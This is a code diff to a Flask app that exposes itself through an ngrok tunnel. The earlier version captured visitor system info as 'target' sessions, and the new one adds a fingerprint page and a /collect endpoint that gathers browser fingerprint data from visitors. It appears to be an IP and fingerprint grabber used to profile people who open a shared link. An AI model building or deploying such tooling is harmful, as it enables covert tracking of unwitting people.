@@ -10,7 +10,7 @@ import threading
 from pathlib import Path
 from helper.systemInfo import SystemInfo
 from helper.session import Session
-from flask import Flask, after_this_request, jsonify, request
+from flask import Flask, after_this_request, jsonify, request, render_template, redirect, url_for 
 from pyngrok import ngrok
 
 app = Flask(__name__)
@@ -116,31 +116,44 @@ def parse_args() -> argparse.Namespace:
     )
     return parser.parse_args()
 
+@app.route('/')
+def index():
+    return redirect(url_for('fingerprint'))
 
-@app.route("/")
-def home():
-    target = SystemInfo().collect_info(request)
-    output_file = Session().save_session(target)
-    payload = {
-        "target": target,
-        "saved_to": str(output_file.resolve()),
+@app.route('/fingerprint')
+def fingerprint():
+    return render_template('fingerprint.html')
+
+def serialize(obj):
+    if isinstance(obj, datetime.datetime):
+        return obj.isoformat()
+    if isinstance(obj, set):
+        return list(obj)
+    return str(obj)  #
+
+    
+# 🕷️ COLLECT JS DATA (POST /collect)
+@app.route('/collect', methods=['POST'])
+def collect_fp():
+    data = request.json
+    info = SystemInfo()
+    
+    full_info = {
+        "sysInfo": info.collect_info(request), 
+        "data": data 
     }
-
-    print("\n[+] New session captured")
-    print(json.dumps(payload, indent=2))
-
-    @after_this_request
-    def close_after_response(response):
-        close_tunnel()
-        did_shutdown = shutdown_server()
-        if not did_shutdown:
-            threading.Timer(1.0, force_exit).start()
-        print("[*] Tunnel closed and server stopped after session capture.")
-        return response
-
-    return jsonify(payload)
+    
+    return {"status": full_info}
 
 
+@app.route('/close_tunnel', methods=['GET'])
+def close():
+    close_tunnel()
+    return {"status": "closed"}
+
+@app.route('/favicon.ico', methods=['GET'])
+def icon():
+    return ''
 if __name__ == "__main__":
     args = parse_args()
     ACTIVE_TUNNEL_PROVIDER = args.tunnel
